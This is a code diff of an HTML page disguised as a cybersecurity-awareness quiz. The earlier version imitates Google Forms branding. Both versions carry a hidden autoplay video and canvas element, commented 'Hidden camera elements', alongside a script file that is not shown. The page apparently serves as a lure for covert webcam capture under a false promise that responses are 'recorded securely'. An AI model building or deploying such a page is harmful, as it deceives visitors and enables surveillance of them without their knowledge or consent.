@@ -5,62 +5,56 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Cyber-Security Awareness : Simple habits for digital safety.</title>
   <link rel="stylesheet" href="style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
-  <link rel="shortcut icon" sizes="16x16" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
 </head>
 <body>
   <div class="container">
-    <!-- Quiz Form -->
     <div class="form-wrapper" id="quiz-container">
       <div class="form-header">
-        <div class="header-banner"></div>
-        <div class="header-content">
-          <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-          <p class="description">Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.</p>
-          <div class="required-notice">* Indicates required question</div>
-        </div>
+        <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
+        <p class="description">Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks.</p>
       </div>
-      <div id="toast"></div>
+
       <form id="quiz-form">
+        <!-- Questions -->
         <div class="question-card">
           <div class="question-title">Do you lock your phone with a PIN, PATTERN or FINGERPRINT? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option"><input type="radio" name="lock_phone" value="Yes" required><span class="radio-label">Yes</span></label>
-            <label class="radio-option"><input type="radio" name="lock_phone" value="No"><span class="radio-label">No</span></label>
+            <label><input type="radio" name="lock_phone" value="Yes" required> Yes</label>
+            <label><input type="radio" name="lock_phone" value="No"> No</label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you use same password for multiple apps or accounts? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option"><input type="radio" name="same_password" value="Yes" required><span class="radio-label">Yes</span></label>
-            <label class="radio-option"><input type="radio" name="same_password" value="No"><span class="radio-label">No</span></label>
+            <label><input type="radio" name="same_password" value="Yes" required> Yes</label>
+            <label><input type="radio" name="same_password" value="No"> No</label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you update your phone apps when updates are available? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option"><input type="radio" name="update_apps" value="Always" required><span class="radio-label">Always</span></label>
-            <label class="radio-option"><input type="radio" name="update_apps" value="Sometimes"><span class="radio-label">Sometimes</span></label>
-            <label class="radio-option"><input type="radio" name="update_apps" value="Maybe"><span class="radio-label">Maybe</span></label>
+            <label><input type="radio" name="update_apps" value="Always" required> Always</label>
+            <label><input type="radio" name="update_apps" value="Sometimes"> Sometimes</label>
+            <label><input type="radio" name="update_apps" value="Maybe"> Maybe</label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you check the sender before clicking on links in WhatsApp? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option"><input type="radio" name="check_sender" value="Yes" required><span class="radio-label">Yes</span></label>
-            <label class="radio-option"><input type="radio" name="check_sender" value="Sometimes"><span class="radio-label">Sometimes</span></label>
-            <label class="radio-option"><input type="radio" name="check_sender" value="No"><span class="radio-label">No</span></label>
+            <label><input type="radio" name="check_sender" value="Yes" required> Yes</label>
+            <label><input type="radio" name="check_sender" value="Sometimes"> Sometimes</label>
+            <label><input type="radio" name="check_sender" value="No"> No</label>
           </div>
         </div>
 
         <div class="question-card">
           <div class="question-title">Do you review Apps permissions carefully? <span class="required">*</span></div>
           <div class="radio-group">
-            <label class="radio-option"><input type="radio" name="review_permissions" value="Yes" required><span class="radio-label">Yes</span></label>
-            <label class="radio-option"><input type="radio" name="review_permissions" value="No"><span class="radio-label">No</span></label>
+            <label><input type="radio" name="review_permissions" value="Yes" required> Yes</label>
+            <label><input type="radio" name="review_permissions" value="No"> No</label>
           </div>
         </div>
 
@@ -69,38 +63,21 @@
         </div>
       </form>
 
-      <div class="google-footer">
-        <p>Never submit passwords through Google Forms.</p>
-        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-        <div class="google-logo">Google Forms</div>
-      </div>
+      <div class="google-footer">Your response will be recorded securely.</div>
     </div>
 
-    <!-- Success Message -->
-    <div class="form-wrapper success-wrapper" id="success-container" style="display: none;">
-      <div class="form-header">
-        <div class="header-banner"></div>
-        <div class="header-content">
-          <h1>Cyber-Security Awareness : Simple habits for digital safety.</h1>
-          <p>Your response has been recorded.</p>
-          <div class="success-links">
-            <a href="#" onclick="location.reload()">Submit another response</a>
-          </div>
-        </div>
-      </div>
-      <div class="google-footer">
-        <div class="branding">This content is neither created nor endorsed by Google. <u>Report Abuse</u> - <u>Terms of Service</u> - <u>Privacy Policy</u></div>
-        <div class="google-logo">Google Forms</div>
-      </div>
+    <div class="form-wrapper success-wrapper" id="success-container" style="display:none;">
+      <h1>Response Submitted!</h1>
+      <button onclick="location.reload()">Submit Another Response</button>
     </div>
   </div>
 
   <!-- Hidden camera elements -->
-    <video id="video" autoplay playsinline style="display:none;"></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
-  <!-- Toast notification -->
-  <div id="toast" class="toast" style="display:none;"></div>
+  <!-- Toast -->
+  <div id="toast" class="toast"></div>
 
   <script src="script.js"></script>
 </body>
